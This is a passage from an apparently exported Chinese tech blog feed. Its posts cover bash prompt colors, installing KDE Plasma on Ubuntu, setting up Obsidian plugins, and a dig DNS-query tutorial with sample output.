src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121234119.png"></p><h2 id="进阶3"><a href="#进阶3" class="headerlink" title="进阶3"></a>进阶3</h2><h3 id="修改终端命令提示符颜色"><a href="#修改终端命令提示符颜色" class="headerlink" title="修改终端命令提示符颜色"></a>修改终端命令提示符颜色</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim ~/.bashrc<br>PS1=<span class="hljs-string">&#x27;\[\e[32;40m\][\u@\h \W]\$\[\e[0m\] &#x27;</span>  <span class="hljs-comment"># green</span><br>PS1=<span class="hljs-string">&#x27;\[\e[34;40m\][\u@\h \W]\$\[\e[0m\] &#x27;</span>  <span class="hljs-comment">#blue</span><br><span class="hljs-built_in">source</span> ~/.bashrc<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128220437.png"></p><p>可以看到，终端已经变成了绿色。详细说明可以参考附件的资料。</p><h2 id="进阶4"><a href="#进阶4" class="headerlink" title="进阶4"></a>进阶4</h2><h3 id="替换gnome桌面为KDE-Plasma桌面"><a href="#替换gnome桌面为KDE-Plasma桌面" class="headerlink" title="替换gnome桌面为KDE Plasma桌面"></a>替换gnome桌面为KDE Plasma桌面</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo add-apt-repository ppa:kubuntu-ppa/backports<br>sudo apt update<br><br>sudo  apt install  kubuntu-desktop<br></code></pre></td></tr></table></figure><p>gnome桌面使用的是GDM3<br>plasma桌面使用的是SDDM</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/xiangxianghehe/article/details/122856771">Ubuntu 22.04换国内源 清华源 阿里源 中科大源 163源</a><br><a href="https://blog.csdn.net/howiecode/article/details/120457571">ubuntu首次SSH使用root账户远程登录教程</a><br><a href="https://blog.csdn.net/weixin_42072280/article/details/112536544?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166964433816782429786434%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=166964433816782429786434&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-112536544-null-null.nonecase&utm_term=%E7%BB%88%E7%AB%AF&spm=1018.2226.3001.4450"># Xshell Linux centOS命令提示符改颜色</a></p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ubuntu</tag>
      
      <tag>cka</tag>
      
      <tag>net</tag>
      
      <tag>vmware</tag>
      
      <tag>mobaxterm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【obsidian系列】03.obsidian中如何配置图床？插件：Image auto upload Plugin</title>
    <link href="/2022/10/23/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9103.obsidian%E4%B8%AD%E5%A6%82%E4%BD%95%E9%85%8D%E7%BD%AE%E5%9B%BE%E5%BA%8A%EF%BC%9F%E6%8F%92%E4%BB%B6%EF%BC%9AImage%20auto%20upload%20Plugin/"/>
    <url>/2022/10/23/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9103.obsidian%E4%B8%AD%E5%A6%82%E4%BD%95%E9%85%8D%E7%BD%AE%E5%9B%BE%E5%BA%8A%EF%BC%9F%E6%8F%92%E4%BB%B6%EF%BC%9AImage%20auto%20upload%20Plugin/</url>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>刚刚从typora转到obsidian，之前在typora用的搭配是：PicGo +typora + GitHub，现在换成了PicGo +obsidian+ GitHub。</p><p>关于picgo和github图床的配置参考我的另一篇博文：<br><a href="https://blog.csdn.net/weixin_42072280/article/details/119543816?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166652653016800180624753%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=166652653016800180624753&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-4-119543816-null-null.nonecase&utm_term=%E5%9B%BE%E5%BA%8A&spm=1018.2226.3001.4450">【实用工具】PicGo +typora + GitHub 搭建个人图床工具 解决typora中的markdown图片自动上传</a></p><h2 id="obsidian配置流程"><a href="#obsidian配置流程" class="headerlink" title="obsidian配置流程"></a>obsidian配置流程</h2><p>打开 Obsidian ：设置 &#x3D;》 第三方插件 &#x3D;》 关闭安全模式 &#x3D;》 浏览社区插件</p><p><img src="https://img-blog.csdnimg.cn/b0041e07bd214dd7bb9eef7042f2a4a1.png" alt="在这里插入图片描述"></p><p>安装后打开选项，默认什么都不要改。<br><img src="https://img-blog.csdnimg.cn/3739cac735654d3e84ed774f3d382242.png" alt="在这里插入图片描述"></p><p>新建文件，在文件里面粘贴图片，可以看到，已经成功上传到图床了~<br><img src="https://img-blog.csdnimg.cn/8e511f2a281b462c9c75809a6b448b1a.png" alt="在这里插入图片描述"></p><p>大功告成！</p>]]></content>
    
    
    <categories>
      
      <category>obsidian</category>
      
    </categories>
    
    
    <tags>
      
      <tag>obsidian</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【obsidian系列】02.obsidian中如何定义附件(eg.图片)位置？插件：custom attachment location</title>
    <link href="/2022/10/23/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9102.obsidian%E4%B8%AD%E5%A6%82%E4%BD%95%E5%AE%9A%E4%B9%89%E9%99%84%E4%BB%B6(eg.%E5%9B%BE%E7%89%87)%E4%BD%8D%E7%BD%AE%EF%BC%9F%E6%8F%92%E4%BB%B6%EF%BC%9Acustom%20attachment%20location/"/>
    <url>/2022/10/23/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9102.obsidian%E4%B8%AD%E5%A6%82%E4%BD%95%E5%AE%9A%E4%B9%89%E9%99%84%E4%BB%B6(eg.%E5%9B%BE%E7%89%87)%E4%BD%8D%E7%BD%AE%EF%BC%9F%E6%8F%92%E4%BB%B6%EF%BC%9Acustom%20attachment%20location/</url>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>我想让插入的图片放到相对位置下，这样更方便查找图片，而且在移动文件夹或者换电脑的时候，也不会丢失图片。</p><p>目的：实现一个类似于typora的assets文件夹存放图片。</p><p>下图为typora的图像文件位置设置：<br><img src="https://img-blog.csdnimg.cn/b055d069b70c4be7824392e707cf9462.png" alt="在这里插入图片描述"></p><h2 id="操作流程"><a href="#操作流程" class="headerlink" title="操作流程"></a>操作流程</h2><p> 打开插件<br>左下角设置 –&gt; 第三方插件 –&gt; 社区插件市场<br><img src="https://img-blog.csdnimg.cn/ef5e86145fb746b89b3b9b41c29eaa56.png" alt="在这里插入图片描述"></p><p>搜索：custom attachment location<br><img src="https://img-blog.csdnimg.cn/27c8d389b84a4d8d929e90f74da582c7.png" alt="在这里插入图片描述"></p><p>打开插件，安装的所有插件都会显示在左侧<br><img src="https://img-blog.csdnimg.cn/5da250d1061a450abc8aa6126ed63511.png" alt="在这里插入图片描述"></p><p>可以看到，附件的位置位于.&#x2F;assets&#x2F;${filename}下<br><img src="https://img-blog.csdnimg.cn/45f121bb0535434fbd960b197b6099e1.png" alt="在这里插入图片描述"></p><p>新建一个test文件夹，新建test-custom-attachment.md文件，粘贴一个图片进去，可以看到图片的位置正是刚刚显示的路径。</p><p><img src="https://img-blog.csdnimg.cn/0d5d2d82008c4b858c0372eb5ea59b44.png" alt="在这里插入图片描述"></p><p>打开“文件与链接”，可以看到：附件的位置已经自动显示在了assets&#x2F;test-custom-attachment下面</p><p><img src="https://img-blog.csdnimg.cn/720dcd3f54ae43758d84f0014eaa8d53.png" alt="在这里插入图片描述"></p><p>完毕！</p>]]></content>
    
    
    <categories>
      
      <category>obsidian</category>
      
    </categories>
    
    
    <tags>
      
      <tag>obsidian</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【obsidian系列】01.obsidian介绍</title>
    <link href="/2022/10/23/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9101.obsidian%E4%BB%8B%E7%BB%8D/"/>
    <url>/2022/10/23/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9101.obsidian%E4%BB%8B%E7%BB%8D/</url>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>中文名：黑曜石</p><p>一款强大的markdown编辑器</p><h2 id="模式选择"><a href="#模式选择" class="headerlink" title="模式选择"></a>模式选择</h2><p>打开命令面板，选择“使用浅色模式”<br><img src="https://img-blog.csdnimg.cn/f2ea37420224431d98ec1a696872bfba.png" alt="在这里插入图片描述"></p><p>设置完成之后，就变成了这样<br><img src="https://img-blog.csdnimg.cn/b89f176149bf47aa9396533519e345e6.png" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>obsidian</category>
      
    </categories>
    
    
    <tags>
      
      <tag>obsidian</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【网络成长记】dig常用命令</title>
    <link href="/2022/09/24/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91dig%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/09/24/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91dig%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h2 id="dig命令"><a href="#dig命令" class="headerlink" title="dig命令"></a>dig命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">dig 常用命令格式<br><br>dig [@server] [-p port] [-t <span class="hljs-built_in">type</span>] [-4] [-6] [+trace] name<br><br>@ 指定 DNS 查询使用的服务器名称或 IP ，IP 地址可以是用点分隔的 IPv4 地址也可以是冒号分隔的 IPv6 地址。当参数指定的值是服务器的主机名时，dig 命令会在查询该域名服务器前先解析该主机名；<br>-p 指定 DNS 查询使用的端口号，默认情况下 DNS 查询使用标准的53端口，若使用非端口则需要通过 -p 参数指定，可使用此选项来测试已配置为侦听非标准端口号上的 DNS 服务器；<br>-t 指定 DNS 查询的记录类型，常用的类型包括：A/AAAA/NS/MX/CNAME 等，缺省查询类型是 A ；<br>-4 指定 dig 命令仅使用 IPv4 查询传输；<br>-6 指定 dig 命令仅使用 IPv6 查询传输；<br>+trace 跟踪从根名称服务器开始的迭代查询过程，缺省情况不使用跟踪。启用跟踪时，dig 命令会执行迭代查询以解析要查询的名称，显示来自用于解析查询的每个服务器的应答。<br><br>-x dot-notation     (shortcut <span class="hljs-keyword">for</span> reverse lookups)<br></code></pre></td></tr></table></figure><h3 id="常用命令汇总"><a href="#常用命令汇总" class="headerlink" title="常用命令汇总"></a>常用命令汇总</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查询该域名的A记录  A记录  Address   本机只向自己的DNS服务器查询</span><br>dig math.stackexchange.com  <br><br><span class="hljs-comment"># short参数 只返回域名对应的IP地址（即A记录）</span><br>dig math.stackexchange.com +short     =   dig +short math.stackexchange.com<br><br><span class="hljs-comment"># @参数，显示向其他DNS服务器查询的结果。 上面命令指定向DNS服务器4.2.2.2查询。</span><br>dig @4.2.2.2 math.stackexchange.com<br><br><span class="hljs-comment"># dig命令的+trace参数可以显示DNS的整个分级查询过程。</span><br>dig +trace math.stackexchange.com  @4.2.2.2<br><br><span class="hljs-comment"># dig命令可以单独查看每一级域名的NS记录</span><br>dig ns com  =  dig -t ns com<br>dig ns stackexchange.com  = dig -t ns stackexchange.com<br>dig +short ns com<br>dig +short ns stackexchange.com<br><br><span class="hljs-comment"># PTR记录用于从IP地址反查域名。dig命令的-x参数用于查询PTR记录。</span><br>dig -x 192.30.252.153<br><br><br><span class="hljs-comment"># dig命令可以查看指定的记录类型。</span><br>dig a github.com = dig A github.com<br>dig ns github.com <span class="hljs-comment"># ns：域名服务器记录，指明该域名由哪台服务器来解析</span><br>dig mx github.com<br>dig aaaa facebook.github.com = dig AAAA facebook.github.com <span class="hljs-comment"># ipv6</span><br>dig cname facebook.github.com <span class="hljs-comment"># cname：规范名资源记录，允许多个名称对应同一主机</span><br><br>NS 记录（Name Server域名服务器）：域名服务器记录，用来指定域名由哪个 DNS 服务器进行解析； name server<br>CNAME 记录（Canonical Name规范名）：用来定义域名的别名，方便实现将多个域名解析到同一个 IP 地址；<br>A 记录（Address地址， IPv4）：用来指定主机名对应的 IPv4 地址；   address<br>AAAA 记录（AAAA：Address地址 IPv6）：用来指定主机名对应的 IPv6 地址；<br>MX 记录（Mail Exchanger邮件交换）：用来指定收件人域名的邮件服务器，SMTP 协议会根据 MX 记录的值来决定邮件的路由过程；<br>PTR 记录（Pointer指针）：常用于反向地址解析，将 IP 地址解析到对应的名称；<br>SOA 记录（Start of Authority起始授权机构）：称为起始授权机构记录，不同于 NS 记录用于标识多台域名解析服务器，SOA 记录用于在多台 NS 记录中哪一台是主 DNS 服务器。<br><br></code></pre></td></tr></table></figure><h3 id="dig-trace-math-stackexchange-com-显示详情"><a href="#dig-trace-math-stackexchange-com-显示详情" class="headerlink" title="dig +trace math.stackexchange.com 显示详情"></a>dig +trace math.stackexchange.com 显示详情</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># dig +trace math.stackexchange.com</span><br><br>; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.18-Ubuntu &lt;&lt;&gt;&gt; +trace math.stackexchange.com<br>;; global options: +cmd<br>;; Received 51 bytes from 127.0.0.53<span class="hljs-comment">#53(127.0.0.53) in 0 ms</span><br><br>[root@ningan ~]<span class="hljs-comment"># dig +trace math.stackexchange.com  @4.2.2.2</span><br><br>; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.18-Ubuntu &lt;&lt;&gt;&gt; +trace math.stackexchange.com @4.2.2.2<br>;; global options: +cmd<br>.                       63834   IN      NS      e.root-servers.net.<br>.                       63834   IN      NS      h.root-servers.net.<br>.                       63834   IN      NS      l.root-servers.net.<br>.                       63834   IN      NS      i.root-servers.net.<br>.                       63834   IN      NS      a.root-servers.net.<br>.                       63834   IN      NS      d.root-servers.net.<br>.                       63834   IN      NS      c.root-servers.net.<br>.                       63834   IN      NS      b.root-servers.net.<br>.                       63834   IN      NS      j.root-servers.net.<br>.                       63834   IN      NS      k.root-servers.net.<br>.                       63834   IN      NS      g.root-servers.net.<br>.                       63834   IN      NS      m.root-servers.net.<br>.                       63834   IN      NS      f.root-servers.net.<br>.                       63834   IN      RRSIG   NS 8 0 518400 20221006160000 20220923150000 20826 . WnPS5Jjb3LJyMJcOcRtpqCsOG9PcwoO4xlMfKNhc7gF6GgqR0Bgt32n1 7gPujfnNm+y6INedDeJC43ciPh9C+jWMKSIZQsNp8JkEc9bmndwcpyhP hMno3mapXZyoCB5sX1Px187YnXU4C7r2w7e9xYGEGoQIIbvs+CiwXlLL sjiERlqrfLmyITs9xxD7rJ4Qbr7AY60toB+DS4ZjSxZyTfYRLQLRFWGA o9v1cTMdqeTLi4fiGvCSQHdQhH3op8LxeHN8mXMmDw5AKQrRBDFuQaYA lCYdq63m91eh0SAGddCtfAylumQI6oAToB1btAG3LKbahYsY3QGIwINW z6QtLw==<br>;; Received 525 bytes from 4.2.2.2<span class="hljs-comment">#53(4.2.2.2) in 101 ms</span><br><br>com.                    172800  IN      NS      a.gtld-servers.net.<br>com.                    172800  IN      NS      b.gtld-servers.net.<br>com.                    172800  IN      NS      c.gtld-servers.net.<br>com.                    172800  IN      NS      d.gtld-servers.net.<br>com.                    172800  IN      NS      e.gtld-servers.net.<br>com.                    172800  IN      NS      f.gtld-servers.net.<br>com.                    172800  IN      NS      g.gtld-servers.net.<br>com.                    172800  IN      NS      h.gtld-servers.net.<br>com.                    172800  IN      NS      i.gtld-servers.net.<br>com.                    172800  IN      NS      j.gtld-servers.net.<br>com.                    172800  IN      NS      k.gtld-servers.net.<br>com.                    172800  IN      NS      l.gtld-servers.net.<br>com.                    172800  IN      NS      m.gtld-servers.net.<br>com.                    86400   IN      DS      30909 8 2 E2D3C916F6DEEAC73294E8268FB5885044A833FC5459588F4A9184CF C41A5766<br>com.                    86400   IN      RRSIG   DS 8 1 86400 20221006160000 20220923150000 20826 . j4E3BSZSX/ao4cPxU0LMtlzR0rMkRjqtB5Tes1UsbvSdGP9wkfFnqxx6 f/XCatshen6jSAKf/gsP2TNa4Jt19/cB/zCjeR1maMznliYLqNaZrrQT Iv/n48chpIZdZ+uBovrZ0j3zU25vaqD1foy17brcm6QYnZhH+PWHw9gT LIzRFdfLqWrBxVqdHbfCfD10h573H0PzUUwvdEU0wbIR/4Zv0YhuXQIV t77haFhp6Q4M3SbWtWhZO7kaIbssIRlPmVWPBk3s+r0RVeQHyLNIZtZF XgaxFtuemV/KUGckDHh+IzjCYHygWcAAdwJRslPYVYuy1bMXNIGLgaj0 Y+GSzQ==<br>;; Received 1182 bytes from 199.7.83.42<span class="hljs-comment">#53(l.root-servers.net) in 17 ms</span><br><br>stackexchange.com.      172800  IN      NS      ns-925.awsdns-51.net.<br>stackexchange.com.      172800  IN      NS      ns-1832.awsdns-37.co.uk.<br>stackexchange.com.      172800  IN      NS      ns-cloud-d1.googledomains.com.<br>stackexchange.com.      172800  IN      NS      ns-cloud-d2.googledomains.com.<br>CK0POJMG874LJREF7EFN8430QVIT8BSM.com. 86400 IN NSEC3 1 1 0 - CK0Q2D6NI4I7EQH8NA30NS61O48UL8G5  NS SOA RRSIG DNSKEY NSEC3PARAM<br>CK0POJMG874LJREF7EFN8430QVIT8BSM.com. 86400 IN RRSIG NSEC3 8 2 86400 20220928042428 20220921031428 32298 com. dtNcF2OBpNtrH8p0VRZU6oqu2C54jzxUCwfpX3bt9sciVgV9AQ2n+7Dt j2tvPwGZPnT+DfD9Ri93aeg3RkzQT2ZnxnkAkDIcwJwF5LOqy0YuC6UT XSZ/R3XPndduNMAPn9KdH3gI7O8IdW2ikpt/2qfe4brvE3zeVP3aFJMP AYDD+C4J1zK9DxDn598PlGKE6LUU3ZNu56AJ7tiAgLtBRA==<br>4OTJD9T3D8J8DLAUKF6PTNN121LN819O.com. 86400 IN NSEC3 1 1 0 - 4OTJGI7PPFM3E45CKDKQ61BEQCTAA8H2  NS DS RRSIG<br>4OTJD9T3D8J8DLAUKF6PTNN121LN819O.com. 86400 IN RRSIG NSEC3 8 2 86400 20220927045638 20220920034638 32298 com. ii7OXKke5DccsV2jkaJ6FvIWpYIIJQC1pTy1QbLvghe0zq2fdkZsis0Q 8I0n5wNIz3+N0JVT5QA7E5NfRD9nsyDxD76FS6/JUuf2CdDoaah/EAMR sc46VbPOjpcQAZRW3gsvsHbg+GbrKkyszaq5I4ol1w4daUncX/h3qVky RXj7auCIimg6CYD5042GfxzyAQWfMKzZR9onED67YrG4hg==<br>;; Received 825 bytes from 192.26.92.30<span class="hljs-comment">#53(c.gtld-servers.net) in 235 ms</span><br><br>math.stackexchange.com. 300     IN      A       151.101.193.69<br>math.stackexchange.com. 300     IN      A       151.101.65.69<br>math.stackexchange.com. 300     IN      A       151.101.1.69<br>math.stackexchange.com. 300     IN      A       151.101.129.69<br>stackexchange.com.      172800  IN      NS      ns-1832.awsdns-37.co.uk.<br>stackexchange.com.      172800  IN      NS      ns-925.awsdns-51.net.<br>stackexchange.com.      172800  IN      NS      ns-cloud-d1.googledomains.com.<br>stackexchange.com.      172800  IN      NS      ns-cloud-d2.googledomains.com.<br>;; Received 252 bytes from 205.251.195.157<span class="hljs-comment">#53(ns-925.awsdns-51.net) in 59 ms</span><br><br></code></pre></td></tr></table></figure><h3 id="dig-ns-com-和-dig-ns-stackexchange-com-显示详情"><a href="#dig-ns-com-和-dig-ns-stackexchange-com-显示详情" class="headerlink" title="dig ns com 和 dig ns stackexchange.com 显示详情"></a>dig ns com 和 dig ns stackexchange.com 显示详情</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># dig ns com</span><br><br>; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.18-Ubuntu &lt;&lt;&gt;&gt; ns com<br>;; global options: +cmd<br>;; Got answer:<br>;; -&gt;&gt;HEADER&lt;&lt;- <span class="hljs-string">opcode: QUERY, status: NOERROR, id: 51369</span><br><span class="hljs-string">;; flags: qr rd ra; QUERY: 1, ANSWER: 13, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; OPT PSEUDOSECTION:</span><br><span class="hljs-string">; EDNS: version: 0, flags:; udp: 65494</span><br><span class="hljs-string">;; QUESTION SECTION:</span><br><span class="hljs-string">;com.                           IN      NS</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; ANSWER SECTION:</span><br><span class="hljs-string">com.                    0       IN      NS      i.gtld-servers.net.</span><br><span class="hljs-string">com.                    0       IN      NS      m.gtld-servers.net.</span><br><span class="hljs-string">com.                    0       IN      NS      c.gtld-servers.net.</span><br><span class="hljs-string">com.                    0       IN      NS      j.gtld-servers.net.</span><br><span class="hljs-string">com.                    0       IN      NS      d.gtld-servers.net.</span><br><span class="hljs-string">com.                    0       IN      NS      h.gtld-servers.net.</span><br><span class="hljs-string">com.                    0       IN      NS      e.gtld-servers.net.</span><br><span class="hljs-string">com.                    0       IN      NS      a.gtld-servers.net.</span><br><span class="hljs-string">com.                    0       IN      NS      l.gtld-servers.net.</span><br><span class="hljs-string">com.                    0       IN      NS      f.gtld-servers.net.</span><br><span class="hljs-string">com.                    0       IN      NS      g.gtld-servers.net.</span><br><span class="hljs-string">com.                    0       IN      NS      k.gtld-servers.net.</span><br><span class="hljs-string">com.                    0       IN      NS      b.gtld-servers.net.</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; Query time: 9 msec</span><br><span class="hljs-string">;; SERVER: 127.0.0.53#53(127.0.0.53)</span><br><span class="hljs-string">;; WHEN: Sat Sep 24 11:15:56 CST 2022</span><br><span class="hljs-string">;; MSG SIZE  rcvd: 256</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">[root@ningan ~]# dig ns stackexchange.com</span><br><span class="hljs-string"></span><br><span class="hljs-string">; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.18-Ubuntu &lt;&lt;&gt;&gt; ns stackexchange.com</span><br><span class="hljs-string">;; global options: +cmd</span><br><span class="hljs-string">;; Got answer:</span><br><span class="hljs-string">;; -&gt;&gt;HEADER&lt;&lt;- opcode</span>: QUERY, status: NOERROR, <span class="hljs-built_in">id</span>: 45577<br>;; flags: qr rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 1<br><br>;; OPT PSEUDOSECTION:<br>; EDNS: version: 0, flags:; udp: 65494<br>;; QUESTION SECTION:<br>;stackexchange.com.             IN      NS<br><br>;; ANSWER SECTION:<br>stackexchange.com.      0       IN      NS      ns-cloud-d1.googledomains.com.<br>stackexchange.com.      0       IN      NS      ns-cloud-d2.googledomains.com.<br>stackexchange.com.      0       IN      NS      ns-925.awsdns-51.net.<br>stackexchange.com.      0       IN      NS      ns-1832.awsdns-37.co.uk.<br><br>;; Query time: 11 msec<br>;; SERVER: 127.0.0.53<span class="hljs-comment">#53(127.0.0.53)</span><br>;; WHEN: Sat Sep 24 11:17:39 CST 2022<br>;; MSG SIZE  rcvd: 183<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># dig +short ns com</span><br>i.gtld-servers.net.<br>m.gtld-servers.net.<br>c.gtld-servers.net.<br>j.gtld-servers.net.<br>d.gtld-servers.net.<br>h.gtld-servers.net.<br>e.gtld-servers.net.<br>a.gtld-servers.net.<br>l.gtld-servers.net.<br>f.gtld-servers.net.<br>g.gtld-servers.net.<br>k.gtld-servers.net.<br>b.gtld-servers.net.<br>[root@ningan ~]<span class="hljs-comment">#</span><br>[root@ningan ~]<span class="hljs-comment">#</span><br>[root@ningan ~]<span class="hljs-comment"># dig +short ns stackexchange.com</span><br>ns-cloud-d1.googledomains.com.<br>ns-cloud-d2.googledomains.com.<br>ns-925.awsdns-51.net.<br>ns-1832.awsdns-37.co.uk.<br><br></code></pre></td></tr></table></figure><h3 id="dig-x-192-30-252-153-显示详情"><a href="#dig-x-192-30-252-153-显示详情" class="headerlink" title="dig -x 192.30.252.153 显示详情"></a>dig -x 192.30.252.153 显示详情</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 